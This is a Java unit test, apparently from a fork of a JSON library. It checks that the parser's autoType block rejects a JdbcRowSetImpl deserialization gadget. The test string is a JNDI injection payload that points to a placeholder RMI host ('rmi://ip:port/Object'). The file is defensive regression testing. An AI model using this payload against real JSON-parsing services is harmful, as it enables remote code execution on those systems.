package com.amyliascarlet.jsontest.bvt.parser.autoType;

import com.amyliascarlet.lib.json.JSON;
import com.amyliascarlet.lib.json.JSONException;
import com.amyliascarlet.lib.json.parser.ParserConfig;
import junit.framework.TestCase;

/**
 * Created by wenshao on 10/02/2017.
 */
public class AutoTypeTest2_deny extends TestCase {
    public void test_0() throws Exception {
        ParserConfig config = new ParserConfig();

        String text = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://ip:port/Object\",\"autoCommit\":true}";

        Exception error = null;
        try {
            JSON.parse(text);
        } catch (JSONException ex) {
            error = ex;
        }

        assertNotNull(error);
        assertTrue(error.getMessage().startsWith("autoType is not support"));
    }
}
